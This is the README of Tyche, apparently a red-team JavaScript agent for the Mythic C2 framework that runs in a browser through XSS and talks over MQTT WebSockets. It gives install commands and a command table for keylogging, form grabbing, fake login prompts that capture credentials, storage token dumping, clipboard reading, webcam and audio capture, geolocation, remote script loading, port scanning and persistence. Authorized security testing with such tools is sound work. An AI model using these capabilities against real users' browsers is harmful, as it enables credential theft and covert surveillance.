<p align="center">
  <img src="documentation-payload/tyche/tyche.svg" width="280" alt="Tyche" />
</p>

Tyche is a browser-based JavaScript agent designed for XSS contexts. It communicates over MQTT WebSockets, supports Mythic encryption, and can dynamically load commands.

## Installation

To install Tyche, you'll need Mythic installed on a remote computer.

From the Mythic install directory, use the following command to install Tyche as the **root** user:

```
./mythic-cli install github https://github.com/grampae/tyche.git
```

From the Mythic install directory, use the following command to install Tyche as a **non-root** user:

```
sudo -E ./mythic-cli install github https://github.com/grampae/tyche.git
```

Once installed, restart Mythic to build a new agent.

## Notable Features

- Browser-native execution in the active page context
- Designed for XSS operations and user interaction in the browser
- Mythic encryption with dynamic command loading
- Optional build-time obfuscation presets
- MQTT WebSocket C2 communications

## Commands Manual Quick Reference

Command | Syntax | Description
------- | ------ | -----------
clipboard | `clipboard` | Read the victim's clipboard contents.
dom_extract | `dom_extract` | Scrape the page DOM for forms, hidden inputs, emails, meta tags, comments, scripts, and iframes.
drive_download | `drive_download https://example.com/file.exe` | Trigger a file download in the victim's browser from a URL.
eval_js | `eval_js alert('hello')` | Execute JavaScript in the browser context via `eval()`.
exit | `exit` | Task agent to exit.
fakemalware | `fakemalware` | Display aggressive fake popups and visual noise for demo/testing.
fingerprint | `fingerprint` | Collect a detailed browser fingerprint.
form_grabber | `form_grabber {"duration":120}` | Intercept form submissions for a specified duration.
geolocation | `geolocation` | Get the victim's physical location via the Geolocation API.
get_url | `get_url https://example.com/` | Perform an HTTP GET from the victim browser.
hook_ajax | `hook_ajax {"duration":60}` | Intercept XHR and fetch traffic for a specified duration.
iframe | `iframe https://example.com/login` | Display a full-page overlay iframe.
inject_script | `inject_script https://example.com/payload.js` | Load and execute an external JavaScript file.
keylogger | `keylogger {"duration":60}` | Capture keystrokes in the current page for a specified duration.
media_record | `media_record {"duration":10,"type":"audio"}` | Record audio and/or video from the victim browser.
notifications | `notifications {"title":"System Alert"}` | Send browser notifications with custom title/body.
phish | `phish {"title":"Session Expired"}` | Inject a fake login modal and capture credentials.
portscan | `portscan {"targets":"192.168.1.0/24","ports":"22,80,443"}` | Perform a browser-based port scan.
post_url | `post_url {"url":"https://example.com/api","body":"hello"}` | Perform an HTTP POST from the victim browser.
screenshot | `screenshot` | Capture a screenshot of the current page.
storage | `storage` | Dump browser storage and scan for common token patterns.
sw_persist | `sw_persist {"action":"status"}` | Manage service worker persistence.
webcam_snap | `webcam_snap` | Capture a single webcam frame.

## Supported C2 Profiles

### mqtt

Tyche uses the Mythic `mqtt` profile and communicates over MQTT WebSockets. All profile configuration is set in Mythic and injected at build time.
